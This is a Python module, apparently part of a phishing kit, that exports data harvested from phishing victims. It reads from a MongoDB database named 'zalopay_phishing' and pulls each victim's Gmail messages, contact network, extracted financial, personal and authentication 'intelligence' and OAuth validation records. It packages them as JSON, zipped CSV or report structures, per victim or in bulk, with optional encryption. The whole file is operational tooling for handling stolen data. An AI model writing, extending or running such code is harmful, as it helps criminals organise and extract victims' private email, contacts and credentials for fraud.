"""
Gmail Data Export Manager
Export Gmail intelligence data in various formats
"""

import os
import json
import csv
import time
import zipfile
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple, IO
import logging
import io
import base64

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ExportConfig:
    """Export configuration"""

    def __init__(self):
        self.max_export_size = int(os.getenv("MAX_EXPORT_SIZE", "104857600"))  # 100MB
        self.default_format = os.getenv("DEFAULT_EXPORT_FORMAT", "json")
        self.enable_compression = os.getenv("ENABLE_COMPRESSION", "true").lower() == "true"
        self.compression_level = int(os.getenv("COMPRESSION_LEVEL", "6"))
        self.enable_encryption = os.getenv("ENABLE_ENCRYPTION", "true").lower() == "true"
        self.chunk_size = int(os.getenv("EXPORT_CHUNK_SIZE", "8192"))

class GmailDataExporter:
    """Gmail data export engine"""

    def __init__(self, mongodb_connection=None, redis_client=None, encryption_manager=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client
        self.encryption = encryption_manager

        self.config = ExportConfig()
        self.export_history: List[Dict[str, Any]] = []

    def export_victim_data(self, victim_id: str, export_format: str = "json",
                          include_types: List[str] = None, encryption_key: str = None) -> Dict[str, Any]:
        """
        Export all Gmail data for victim

        Args:
            victim_id: Victim identifier
            export_format: Export format (json, csv, pdf)
            include_types: Types of data to include
            encryption_key: Encryption key for sensitive data

        Returns:
            Export result with data or file path
        """
        try:
            # Collect all victim data
            victim_data = self._collect_victim_data(victim_id, include_types)

            if not victim_data:
                return {"success": False, "error": "No data found for victim"}

            # Export based on format
            if export_format.lower() == "json":
                export_result = self._export_json(victim_data, encryption_key)
            elif export_format.lower() == "csv":
                export_result = self._export_csv(victim_data, encryption_key)
            elif export_format.lower() == "pdf":
                export_result = self._export_pdf(victim_data, encryption_key)
            else:
                return {"success": False, "error": f"Unsupported format: {export_format}"}

            if export_result["success"]:
                # Record export in history
                self._record_export(victim_id, export_format, export_result["size"])

                logger.info(f"Data exported for victim: {victim_id} - Format: {export_format}")
                return export_result
            else:
                return export_result

        except Exception as e:
            logger.error(f"Error exporting victim data: {e}")
            return {"success": False, "error": "Export failed"}

    def _collect_victim_data(self, victim_id: str, include_types: List[str] = None) -> Dict[str, Any]:
        """Collect all data for victim"""
        try:
            victim_data = {
                "victim_id": victim_id,
                "exported_at": datetime.now(timezone.utc).isoformat(),
                "data_types": []
            }

            # Define default types if not specified
            if include_types is None:
                include_types = ["messages", "contacts", "intelligence", "validation"]

            # Collect messages
            if "messages" in include_types:
                messages_data = self._get_victim_messages(victim_id)
                if messages_data:
                    victim_data["messages"] = messages_data
                    victim_data["data_types"].append("messages")

            # Collect contacts
            if "contacts" in include_types:
                contacts_data = self._get_victim_contacts(victim_id)
                if contacts_data:
                    victim_data["contacts"] = contacts_data
                    victim_data["data_types"].append("contacts")

            # Collect intelligence
            if "intelligence" in include_types:
                intelligence_data = self._get_victim_intelligence(victim_id)
                if intelligence_data:
                    victim_data["intelligence"] = intelligence_data
                    victim_data["data_types"].append("intelligence")

            # Collect validation results
            if "validation" in include_types:
                validation_data = self._get_victim_validation(victim_id)
                if validation_data:
                    victim_data["validation"] = validation_data
                    victim_data["data_types"].append("validation")

            return victim_data

        except Exception as e:
            logger.error(f"Error collecting victim data: {e}")
            return {}

    def _get_victim_messages(self, victim_id: str) -> Optional[List[Dict[str, Any]]]:
        """Get victim messages"""
        try:
            if not self.mongodb:
                return None

            db = self.mongodb.get_database("zalopay_phishing")
            messages_collection = db.gmail_messages

            # Get recent messages (last 30 days)
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=30)
            messages = list(messages_collection.find(
                {"victim_id": victim_id, "received_at": {"$gte": cutoff_date}},
                {"_id": 0}  # Exclude MongoDB ID
            ).limit(1000))

            return messages

        except Exception as e:
            logger.error(f"Error getting victim messages: {e}")
            return None

    def _get_victim_contacts(self, victim_id: str) -> Optional[Dict[str, Any]]:
        """Get victim contact network"""
        try:
            if not self.mongodb:
                return None

            db = self.mongodb.get_database("zalopay_phishing")
            networks_collection = db.contact_networks

            network = networks_collection.find_one({"victim_id": victim_id}, {"_id": 0})
            return network

        except Exception as e:
            logger.error(f"Error getting victim contacts: {e}")
            return None

    def _get_victim_intelligence(self, victim_id: str) -> Optional[List[Dict[str, Any]]]:
        """Get victim intelligence data"""
        try:
            if not self.mongodb:
                return None

            db = self.mongodb.get_database("zalopay_phishing")
            intelligence_collection = db.email_intelligence

            # Get recent intelligence (last 30 days)
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=30)
            intelligence = list(intelligence_collection.find(
                {"victim_id": victim_id, "extracted_at": {"$gte": cutoff_date}},
                {"_id": 0}
            ).limit(1000))

            return intelligence

        except Exception as e:
            logger.error(f"Error getting victim intelligence: {e}")
            return None

    def _get_victim_validation(self, victim_id: str) -> Optional[List[Dict[str, Any]]]:
        """Get victim validation results"""
        try:
            if not self.mongodb:
                return None

            db = self.mongodb.get_database("zalopay_phishing")
            validation_collection = db.oauth_validation

            # Get recent validations (last 30 days)
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=30)
            validations = list(validation_collection.find(
                {"victim_id": victim_id, "validated_at": {"$gte": cutoff_date}},
                {"_id": 0}
            ).limit(1000))

            return validations

        except Exception as e:
            logger.error(f"Error getting victim validation: {e}")
            return None

    def _export_json(self, data: Dict[str, Any], encryption_key: str = None) -> Dict[str, Any]:
        """Export data as JSON"""
        try:
            # Convert to JSON
            json_data = json.dumps(data, indent=2, default=str)

            # Encrypt if key provided
            if encryption_key and self.encryption:
                encrypted_data = self.encryption.encrypt_data(json_data, data_type="export")
                json_data = json.dumps(encrypted_data)

            # Check size
            data_size = len(json_data.encode('utf-8'))

            if data_size > self.config.max_export_size:
                return {
                    "success": False,
                    "error": f"Export size ({data_size}) exceeds maximum ({self.config.max_export_size})"
                }

            return {
                "success": True,
                "format": "json",
                "data": json_data,
                "size": data_size,
                "encrypted": encryption_key is not None
            }

        except Exception as e:
            logger.error(f"Error exporting JSON: {e}")
            return {"success": False, "error": "JSON export failed"}

    def _export_csv(self, data: Dict[str, Any], encryption_key: str = None) -> Dict[str, Any]:
        """Export data as CSV"""
        try:
            csv_files = {}

            # Export messages as CSV
            if "messages" in data:
                messages_csv = self._messages_to_csv(data["messages"])
                csv_files["messages.csv"] = messages_csv

            # Export contacts as CSV
            if "contacts" in data:
                contacts_csv = self._contacts_to_csv(data["contacts"])
                csv_files["contacts.csv"] = contacts_csv

            # Export intelligence as CSV
            if "intelligence" in data:
                intelligence_csv = self._intelligence_to_csv(data["intelligence"])
                csv_files["intelligence.csv"] = intelligence_csv

            # Create ZIP file if multiple CSVs
            if len(csv_files) > 1:
                zip_buffer = io.BytesIO()
                with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                    for filename, content in csv_files.items():
                        zip_file.writestr(filename, content)

                final_data = zip_buffer.getvalue()

                # Encrypt if key provided
                if encryption_key and self.encryption:
                    encrypted_data = self.encryption.encrypt_data(final_data.decode(), data_type="export")
                    final_data = json.dumps(encrypted_data).encode()

            elif len(csv_files) == 1:
                final_data = list(csv_files.values())[0].encode()
            else:
                return {"success": False, "error": "No data to export"}

            # Check size
            data_size = len(final_data)

            if data_size > self.config.max_export_size:
                return {
                    "success": False,
                    "error": f"Export size ({data_size}) exceeds maximum ({self.config.max_export_size})"
                }

            return {
                "success": True,
                "format": "csv",
                "data": base64.b64encode(final_data).decode(),
                "size": data_size,
                "files": list(csv_files.keys()),
                "encrypted": encryption_key is not None
            }

        except Exception as e:
            logger.error(f"Error exporting CSV: {e}")
            return {"success": False, "error": "CSV export failed"}

    def _export_pdf(self, data: Dict[str, Any], encryption_key: str = None) -> Dict[str, Any]:
        """Export data as PDF (placeholder)"""
        try:
            # PDF export would require additional libraries like ReportLab
            # For now, return JSON structure
            pdf_structure = {
                "report_title": f"Gmail Intelligence Report - {data['victim_id']}",
                "generated_at": data["exported_at"],
                "sections": []
            }

            # Add sections based on data types
            if "intelligence" in data:
                pdf_structure["sections"].append({
                    "title": "Intelligence Analysis",
                    "content": data["intelligence"]
                })

            if "contacts" in data:
                pdf_structure["sections"].append({
                    "title": "Contact Network",
                    "content": data["contacts"]
                })

            return {
                "success": True,
                "format": "pdf",
                "data": json.dumps(pdf_structure),
                "size": len(json.dumps(pdf_structure).encode()),
                "note": "PDF export is simplified - full PDF generation requires additional libraries"
            }

        except Exception as e:
            logger.error(f"Error exporting PDF: {e}")
            return {"success": False, "error": "PDF export failed"}

    def _messages_to_csv(self, messages: List[Dict[str, Any]]) -> str:
        """Convert messages to CSV"""
        try:
            output = io.StringIO()
            writer = csv.writer(output)

            # Write header
            writer.writerow([
                "Message ID", "Subject", "From", "To", "Date", "Snippet",
                "Has Attachments", "Label IDs", "Size"
            ])

            # Write message data
            for message in messages:
                headers = message.get("headers", {})

                writer.writerow([
                    message.get("id", ""),
                    headers.get("subject", ""),
                    headers.get("from", ""),
                    headers.get("to", ""),
                    headers.get("date", ""),
                    message.get("snippet", ""),
                    "Yes" if message.get("has_attachments", False) else "No",
                    ",".join(message.get("label_ids", [])),
                    message.get("size_estimate", 0)
                ])

            return output.getvalue()

        except Exception as e:
            logger.error(f"Error converting messages to CSV: {e}")
            return ""

    def _contacts_to_csv(self, contacts_data: Dict[str, Any]) -> str:
        """Convert contacts to CSV"""
        try:
            output = io.StringIO()
            writer = csv.writer(output)

            # Write header
            writer.writerow([
                "Email", "Name", "Frequency", "Importance Score",
                "Relationship Type", "First Seen", "Last Seen"
            ])

            # Write contact data
            contacts = contacts_data.get("contacts", {})
            for email, contact_info in contacts.items():
                writer.writerow([
                    email,
                    contact_info.get("name", ""),
                    contact_info.get("frequency", 0),
                    contact_info.get("importance_score", 0.0),
                    contact_info.get("relationship_type", ""),
                    contact_info.get("first_seen", ""),
                    contact_info.get("last_seen", "")
                ])

            return output.getvalue()

        except Exception as e:
            logger.error(f"Error converting contacts to CSV: {e}")
            return ""

    def _intelligence_to_csv(self, intelligence_data: List[Dict[str, Any]]) -> str:
        """Convert intelligence to CSV"""
        try:
            output = io.StringIO()
            writer = csv.writer(output)

            # Write header
            writer.writerow([
                "Message ID", "Victim ID", "Extracted At", "Extraction Confidence",
                "Financial Data Count", "Personal Data Count", "Business Data Count",
                "Auth Data Count", "Processing Time"
            ])

            # Write intelligence data
            for intelligence in intelligence_data:
                financial_count = sum(len(items) for items in intelligence.get("financial_data", {}).values())
                personal_count = sum(len(items) for items in intelligence.get("personal_data", {}).values())
                business_count = sum(len(items) for items in intelligence.get("business_data", {}).values())
                auth_count = sum(len(items) for items in intelligence.get("auth_data", {}).values())

                writer.writerow([
                    intelligence.get("message_id", ""),
                    intelligence.get("victim_id", ""),
                    intelligence.get("extracted_at", ""),
                    intelligence.get("extraction_confidence", 0.0),
                    financial_count,
                    personal_count,
                    business_count,
                    auth_count,
                    intelligence.get("processing_time", 0.0)
                ])

            return output.getvalue()

        except Exception as e:
            logger.error(f"Error converting intelligence to CSV: {e}")
            return ""

    def _record_export(self, victim_id: str, export_format: str, size: int):
        """Record export in history"""
        try:
            export_record = {
                "victim_id": victim_id,
                "export_format": export_format,
                "size": size,
                "exported_at": datetime.now(timezone.utc).isoformat()
            }

            self.export_history.append(export_record)

            # Keep only last 1000 exports
            if len(self.export_history) > 1000:
                self.export_history = self.export_history[-1000:]

        except Exception as e:
            logger.error(f"Error recording export: {e}")

    def export_intelligence_summary(self, victim_id: str, format: str = "json") -> Dict[str, Any]:
        """Export intelligence summary"""
        try:
            # Get intelligence summary
            summary_data = {
                "victim_id": victim_id,
                "summary_type": "intelligence_overview",
                "generated_at": datetime.now(timezone.utc).isoformat()
            }

            # Add summary statistics
            if self.mongodb:
                summary_data.update(self._get_intelligence_stats(victim_id))

            # Export based on format
            if format.lower() == "json":
                return {
                    "success": True,
                    "format": "json",
                    "data": json.dumps(summary_data, indent=2),
                    "size": len(json.dumps(summary_data).encode())
                }

            else:
                return {"success": False, "error": f"Unsupported format: {format}"}

        except Exception as e:
            logger.error(f"Error exporting intelligence summary: {e}")
            return {"success": False, "error": "Summary export failed"}

    def _get_intelligence_stats(self, victim_id: str) -> Dict[str, Any]:
        """Get intelligence statistics for victim"""
        try:
            if not self.mongodb:
                return {}

            db = self.mongodb.get_database("zalopay_phishing")

            # Get message count
            messages_collection = db.gmail_messages
            message_count = messages_collection.count_documents({"victim_id": victim_id})

            # Get intelligence count
            intelligence_collection = db.email_intelligence
            intelligence_count = intelligence_collection.count_documents({"victim_id": victim_id})

            # Get contact count
            networks_collection = db.contact_networks
            network = networks_collection.find_one({"victim_id": victim_id})
            contact_count = len(network.get("contacts", {})) if network else 0

            # Get validation count
            validation_collection = db.oauth_validation
            validation_count = validation_collection.count_documents({"victim_id": victim_id})

            return {
                "statistics": {
                    "total_messages": message_count,
                    "intelligence_extracted": intelligence_count,
                    "contacts_identified": contact_count,
                    "validations_performed": validation_count
                }
            }

        except Exception as e:
            logger.error(f"Error getting intelligence stats: {e}")
            return {}

    def export_bulk_data(self, victim_ids: List[str], export_format: str = "json",
                        include_types: List[str] = None) -> Dict[str, Any]:
        """Export data for multiple victims"""
        try:
            bulk_data = {
                "export_type": "bulk",
                "victim_count": len(victim_ids),
                "exported_at": datetime.now(timezone.utc).isoformat(),
                "victims": {}
            }

            for victim_id in victim_ids:
                victim_data = self._collect_victim_data(victim_id, include_types)
                if victim_data:
                    bulk_data["victims"][victim_id] = victim_data

            # Export based on format
            if export_format.lower() == "json":
                json_data = json.dumps(bulk_data, indent=2)
                data_size = len(json_data.encode())

                return {
                    "success": True,
                    "format": "json",
                    "data": json_data,
                    "size": data_size,
                    "victim_count": len(bulk_data["victims"])
                }

            else:
                return {"success": False, "error": f"Unsupported format for bulk export: {export_format}"}

        except Exception as e:
            logger.error(f"Error in bulk export: {e}")
            return {"success": False, "error": "Bulk export failed"}

    def get_export_history(self, victim_id: str = None, limit: int = 100) -> List[Dict[str, Any]]:
        """Get export history"""
        try:
            history = []

            for export_record in reversed(self.export_history):
                if victim_id is None or export_record["victim_id"] == victim_id:
                    history.append(export_record)

                if len(history) >= limit:
                    break

            return history

        except Exception as e:
            logger.error(f"Error getting export history: {e}")
            return []

    def cleanup_old_exports(self, days_old: int = 30) -> int:
        """Clean up old export records"""
        try:
            cutoff_date = datetime.now(timezone.utc) - timedelta(days=days_old)

            original_count = len(self.export_history)
            self.export_history = [
                export for export in self.export_history
                if datetime.fromisoformat(export["exported_at"]) > cutoff_date
            ]

            cleaned_count = original_count - len(self.export_history)
            logger.info(f"Cleaned up {cleaned_count} old export records")

            return cleaned_count

        except Exception as e:
            logger.error(f"Error cleaning up old exports: {e}")
            return 0

# Global export manager instance
export_manager = None

def initialize_export_manager(mongodb_connection=None, redis_client=None, encryption_manager=None) -> GmailDataExporter:
    """Initialize global export manager"""
    global export_manager
    export_manager = GmailDataExporter(mongodb_connection, redis_client, encryption_manager)
    return export_manager

def get_export_manager() -> GmailDataExporter:
    """Get global export manager"""
    if export_manager is None:
        raise ValueError("Export manager not initialized")
    return export_manager

# Convenience functions
def export_victim_data(victim_id: str, export_format: str = "json", include_types: List[str] = None,
                      encryption_key: str = None) -> Dict[str, Any]:
    """Export victim data (global convenience function)"""
    return get_export_manager().export_victim_data(victim_id, export_format, include_types, encryption_key)

def export_intelligence_summary(victim_id: str, format: str = "json") -> Dict[str, Any]:
    """Export intelligence summary (global convenience function)"""
    return get_export_manager().export_intelligence_summary(victim_id, format)

def export_bulk_data(victim_ids: List[str], export_format: str = "json", include_types: List[str] = None) -> Dict[str, Any]:
    """Export bulk data (global convenience function)"""
    return get_export_manager().export_bulk_data(victim_ids, export_format, include_types)

def get_export_history(victim_id: str = None, limit: int = 100) -> List[Dict[str, Any]]:
    """Get export history (global convenience function)"""
    return get_export_manager().get_export_history(victim_id, limit)